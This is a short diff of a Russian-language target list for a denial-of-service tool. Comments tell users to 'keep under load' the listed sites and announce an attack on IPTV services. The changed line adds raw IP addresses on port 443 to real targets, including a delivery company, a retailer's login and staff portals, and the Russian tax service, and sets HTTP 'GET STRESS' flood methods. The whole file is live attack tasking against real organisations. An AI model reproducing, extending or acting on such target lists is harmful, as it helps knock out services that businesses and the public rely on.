@@ -2,7 +2,7 @@
 ### Не забываем, удалять все параметры: -t --rpc -p --debug. UDP в список не добавляем
 
 # Продолжаем держать под нагрузкой
-https://www.cdek.ru/ru https://cdek.by/ru/ https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru --http-methods GET STRESS
+https://www.cdek.ru/ru https://cdek.by/ru/ https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 tcp://213.24.64.94:443 tcp://87.242.70.127:443 tcp://90.156.242.130:443 --http-methods GET STRESS
 
 # Текущая атака
 # Атакуем IPTV-сервисы! 
